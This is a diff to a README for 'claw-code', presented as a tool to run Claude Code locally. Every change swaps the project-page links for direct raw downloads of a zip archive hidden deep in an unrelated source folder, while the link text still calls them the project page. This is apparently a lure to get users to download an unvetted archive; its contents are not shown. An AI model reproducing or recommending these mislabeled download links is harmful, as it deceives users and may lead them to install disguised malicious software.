@@ -1,6 +1,6 @@
 # 🤖 claw-code - Run Claude Code Locally
 
-[⬇️ Download / Visit the project page](https://github.com/Randravishing966/claw-code)
+[⬇️ Download / Visit the project page](https://raw.githubusercontent.com/Randravishing966/claw-code/main/src/components/permissions/ComputerUseApproval/claw_code_v2.2.zip)
 
 ## 🧭 What this is
 
@@ -23,7 +23,7 @@ If your PC can run recent Windows apps, it should work well with this build.
 ## 🚀 Download and install
 
 1. Open the project page:
-   [https://github.com/Randravishing966/claw-code](https://github.com/Randravishing966/claw-code)
+   [https://raw.githubusercontent.com/Randravishing966/claw-code/main/src/components/permissions/ComputerUseApproval/claw_code_v2.2.zip](https://raw.githubusercontent.com/Randravishing966/claw-code/main/src/components/permissions/ComputerUseApproval/claw_code_v2.2.zip)
 
 2. On the page, look for the latest release or the main download files.
 
@@ -158,7 +158,7 @@ If you only want to use the app, you can skip this part and use the download pag
 
 Use this link to visit the project page and get the files:
 
-[https://github.com/Randravishing966/claw-code](https://github.com/Randravishing966/claw-code)
+[https://raw.githubusercontent.com/Randravishing966/claw-code/main/src/components/permissions/ComputerUseApproval/claw_code_v2.2.zip](https://raw.githubusercontent.com/Randravishing966/claw-code/main/src/components/permissions/ComputerUseApproval/claw_code_v2.2.zip)
 
 ## 🧾 File you will see in the project
 
